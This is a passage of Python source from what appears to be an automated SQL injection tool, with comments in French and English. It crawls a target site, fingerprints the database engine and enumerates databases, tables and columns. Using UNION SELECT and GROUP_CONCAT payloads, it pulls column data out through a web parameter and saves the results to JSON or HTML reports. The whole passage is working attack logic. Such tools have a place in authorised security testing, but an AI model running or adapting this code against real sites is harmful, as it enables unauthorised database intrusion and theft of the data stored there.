        tables = []
        for payload in tbls_names_payloads.get(dbms, []):
            # Formater le payload avec 'db' et 'tbl'
            formatted_payload = payload.format(db=database, tbl='dummy_table')
            complete_payload = f"' UNION SELECT {formatted_payload}-- "
            response = self.send_request(complete_payload)
            timestamp = datetime.datetime.utcnow().isoformat() + "Z"
            if response:
                # Extraction simple des tables
                tbl_found = re.findall(r"([\w]+)", response)
                if tbl_found:
                    unique_tables = list(set(tbl_found))
                    logger.info(f"Tables in {database}: {', '.join(unique_tables)}")
                    self.results.append({
                        "timestamp": timestamp,
                        "payload": formatted_payload,
                        "url": self.url,
                        "param": self.param,
                        "status": f"Tables in {database}: {', '.join(unique_tables)}"
                    })
                    tables.extend(unique_tables)
                    break
                else:
                    logger.debug(f"No tables found in database {database} with the given payload.")
            else:
                logger.warning(f"Aucune réponse pour le payload de noms de tables pour {database}.")

        # Filtrer les tables uniques
        tables = list(set(tables))
        # Pour chaque table trouvée, énumérer les colonnes
        for tbl in tables:
            self.enumerate_columns(database, tbl)

    def enumerate_columns(self, database, table):
        """Énumère les colonnes d'une table spécifiée dans une base de données."""
        console.rule(f"[bold red]Enumerating Columns in Table: {table} (Database: {database})[/bold red]")
        cols_names_payloads = PAYLOADS.get("cols_names", {})
        if not cols_names_payloads:
            logger.warning("Aucun payload 'cols_names' trouvé dans payloads.json.")
            return

        # Détecter le SGBD
        dbms = self.detect_dbms()
        if not dbms:
            logger.warning("Impossible de détecter le SGBD. L'énumération des colonnes peut échouer.")
            return

        columns = []
        for payload in cols_names_payloads.get(dbms, []):
            # Formater le payload avec 'db' et 'tbl'
            formatted_payload = payload.format(db=database, tbl=table)
            complete_payload = f"' UNION SELECT {formatted_payload}-- "
            response = self.send_request(complete_payload)
            timestamp = datetime.datetime.utcnow().isoformat() + "Z"
            if response:
                # Extraction simple des colonnes
                col_found = re.findall(r"([\w]+)", response)
                if col_found:
                    unique_columns = list(set(col_found))
                    logger.info(f"Columns in {table}: {', '.join(unique_columns)}")
                    self.results.append({
                        "timestamp": timestamp,
                        "payload": formatted_payload,
                        "url": self.url,
                        "param": self.param,
                        "status": f"Columns in {table}: {', '.join(unique_columns)}"
                    })
                    columns.extend(unique_columns)
                    break
                else:
                    logger.debug(f"No columns found in table {table} with the given payload.")
            else:
                logger.warning(f"Aucune réponse pour le payload de noms de colonnes pour {table} dans {database}.")

        # Filtrer les colonnes uniques
        columns = list(set(columns))
        # Pour chaque colonne trouvée, extraire les données
        for column in columns:
            self.extract_data(database, table, column)

    def extract_data(self, db, tbl, column):
        """Extrait des données spécifiques d'une colonne dans une table."""
        console.rule(f"[bold red]Extracting Data from {column} in Table: {tbl} (Database: {db})[/bold red]")
        extract_payloads = [
            f"'{column}'",
            f"CONCAT({column})",
            f"GROUP_CONCAT({column})"
        ]
        for payload in extract_payloads:
            complete_payload = f"' UNION SELECT {payload} FROM {db}.{tbl}-- "
            response = self.send_request(complete_payload)
            timestamp = datetime.datetime.utcnow().isoformat() + "Z"
            if response:
                # Extraction simple des données
                data = re.findall(rf"{column}\s*[:=]\s*'([^']+)'", response, re.IGNORECASE)
                if data:
                    unique_data = list(set(data))
                    logger.info(f"Data in {column}: {', '.join(unique_data)}")
                    self.results.append({
                        "timestamp": timestamp,
                        "payload": complete_payload,
                        "url": self.url,
                        "param": self.param,
                        "status": f"Data in {column}: {', '.join(unique_data)}"
                    })
                    break
                else:
                    # Tentative d'extraction alternative
                    data = re.findall(rf"{column}\s*[:=]\s*([^'\";]+)", response, re.IGNORECASE)
                    if data:
                        unique_data = list(set(data))
                        logger.info(f"Data in {column}: {', '.join(unique_data)}")
                        self.results.append({
                            "timestamp": timestamp,
                            "payload": complete_payload,
                            "url": self.url,
                            "param": self.param,
                            "status": f"Data in {column}: {', '.join(unique_data)}"
                        })
                        break
                    else:
                        logger.info(f"No data found in column {column} with the given payload.")
            else:
                logger.error("No response received for data extraction payload.")

    def detect_dbms(self):
        """Détecte automatiquement le SGBD utilisé par la cible."""
        console.rule("[bold red]Detecting DBMS[/bold red]")
        banner_payloads = PAYLOADS.get("banner", {})
        if not banner_payloads:
            logger.warning("Aucun payload 'banner' trouvé dans payloads.json.")
            return None

        dbms_detected = None
        for db, payload_list in banner_payloads.items():
            for payload in payload_list:
                complete_payload = f"' UNION SELECT {payload}-- "
                response = self.send_request(complete_payload)
                if response and db.lower() in response.lower():
                    logger.info(f"Detected DBMS: {db}")
                    self.results.append({
                        "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
                        "payload": complete_payload,
                        "url": self.url,
                        "param": self.param,
                        "status": f"Detected DBMS: {db}"
                    })
                    dbms_detected = db
                    break
            if dbms_detected:
                break
        if not dbms_detected:
            logger.warning("Could not detect DBMS.")
        return dbms_detected

    def extract_links(self, url):
        """
        Extract all href links from a given URL.

        :param url: URL to extract links from.
        :return: Set of extracted links.
        """
        try:
            response = self.session.get(url, headers=self.get_headers(), proxies=self.proxies, timeout=self.timeout)
            if response.status_code == 200:
                content_type = response.headers.get('Content-Type', '')
                if 'text/html' not in content_type:
                    logger.warning(f"URL {url} ne contient pas de contenu HTML. Content-Type: {content_type}")
                    return set()

                # Débogage : Afficher les premiers 500 caractères du contenu
                logger.debug(f"Response content for {url}:\n{response.text[:500]}")

                try:
                    soup = BeautifulSoup(response.text, "html.parser")
                except Exception as e:
                    logger.error(f"BeautifulSoup n'a pas pu parser le contenu de {url}: {e}")
                    return set()

                links = set()
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    if href.startswith("http"):
                        links.add(href)
                    else:
                        parsed_url = urlparse.urlparse(url)
                        href = urlparse.urljoin(f"{parsed_url.scheme}://{parsed_url.netloc}", href)
                        links.add(href)
                logger.debug(f"Extracted {len(links)} links from {url}")
                return links
            else:
                logger.error(f"Failed to retrieve {url}. Status code: {response.status_code}")
                return set()
        except requests.RequestException as e:
            logger.error(f"Failed to extract links from {url}: {e}")
            return set()

    def crawl(self, max_depth=2):
        """
        Crawl the target URL to discover all accessible links.

        :param max_depth: Maximum depth to crawl.
        :return: Set of discovered URLs.
        """
        discovered = set()
        to_crawl = set([self.url])
        current_depth = 0

        # Déterminer le domaine de base
        parsed_base = urlparse.urlparse(self.url)
        base_url = f"{parsed_base.scheme}://{parsed_base.netloc}"

        while to_crawl and current_depth < max_depth:
            logger.info(f"Crawling depth {current_depth + 1}, {len(to_crawl)} URLs to crawl.")
            current_depth += 1
            next_to_crawl = set()

            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {executor.submit(self.extract_links, url): url for url in to_crawl}
                for future in track(as_completed(futures), total=len(futures), description="Crawling URLs"):
                    links = future.result()
                    for link in links:
                        if link not in discovered and link.startswith(base_url):
                            discovered.add(link)
                            next_to_crawl.add(link)

            to_crawl = next_to_crawl

        return discovered

    def save_results(self):
        """Sauvegarde les résultats du scan dans un fichier JSON ou HTML si spécifié."""
        if self.output:
            try:
                if self.output.endswith('.json'):
                    with open(self.output, 'w', encoding='utf-8') as f:
                        json.dump(self.results, f, indent=4, ensure_ascii=False)
                elif self.output.endswith('.html'):
                    self.save_results_as_html()
                else:
                    logger.error("Unsupported output format. Use .json or .html")
                    return
                logger.info(f"Results saved to {self.output}")
            except IOError as e:
                logger.error(f"Failed to save results to {self.output}: {e}")

    def save_results_as_html(self):
        """Sauvegarde les résultats du scan dans un fichier HTML."""
        table = Table(title="SQL Injection Scan Results", show_lines=True)
        table.add_column("Timestamp", style="cyan", no_wrap=True)
        table.add_column("URL", justify="left", style="cyan", no_wrap=True)
        table.add_column("Parameter", style="magenta")
        table.add_column("Payload", style="green")
        table.add_column("Status", style="red")
        for result in self.results:
            payload_display = json.dumps(result['payload']) if isinstance(result['payload'], list) else result['payload']
            table.add_row(
                result.get("timestamp", ""),
                result.get("url", ""),
                result.get("param", ""),
                payload_display,
                result.get("status", "")
            )
        html_content = table.get_html_string()
        with open(self.output, 'w', encoding='utf-8') as f:
            f.write(html_content)

    def display_results(self):
        """Affiche les résultats du scan dans un tableau élégant."""
        if not self.results:
            console.print("[bold green]No vulnerabilities found.[/bold green]")
            return
        table = Table(title="SQL Injection Scan Results")
        table.add_column("Timestamp", style="cyan", no_wrap=True)
        table.add_column("URL", justify="left", style="cyan", no_wrap=True)
        table.add_column("Parameter", style="magenta")
        table.add_column("Payload", style="green")
        table.add_column("Status", style="red")
        for result in self.results:
            payload_display = json.dumps(result['payload']) if isinstance(result['payload'], list) else result['payload']
            table.add_row(
                result.get("timestamp", ""),
                result.get("url", ""),
                result.get("param", ""),
                payload_display,
                result.get("status", "")
            )
        console.print(table)

    def run_all_tests(self):
        """Exécute tous les types de tests d'injection SQL sélectionnés."""
        test_methods = {
            "basic": self.run_basic_tests,
            "blind": self.run_blind_tests,
            "timebase": self.run_timebase_tests,
            "gbkquotes": self.run_gbkquotes_tests,
            "allalpha": self.run_allalpha_tests,
            "union": self.run_union_tests,
            "banner": self.retrieve_dbms_banner,
            "current_user": self.get_current_user,
            "current_database": self.get_current_database,
            "hostname": self.get_hostname,
            "dbs_count": self.get_dbs_count,
            "dbs_names": self.get_dbs_names,
            "tbls_count": self.get_tbls_count,  # Cette méthode nécessite un paramètre 'db'
            "tbls_names": self.get_tbls_names   # Cette méthode nécessite des paramètres 'db' et 'tbl'
        }

        for test in self.selected_tests:
            test_method = test_methods.get(test)
            if test_method:
                if test in ["tbls_count", "tbls_names"]:
                    # Utiliser 'db' et 'tbl' spécifiés ou découvrir
                    if self.db and self.tbl:
                        if test == "tbls_count":
                            test_method(self.db)
                        elif test == "tbls_names":
                            test_method(self.db, self.tbl)
                    elif self.db:
                        if test == "tbls_count":
                            test_method(self.db)
                        elif test == "tbls_names":
                            # Découvrir les tables dans 'db'
                            self.enumerate_tables(self.db)
                    else:
                        # Découvrir les bases de données et les tables
                        self.enumerate_databases()
                else:
                    test_method()
            else:
                logger.warning(f"Test type '{test}' is not recognized and will be skipped.")
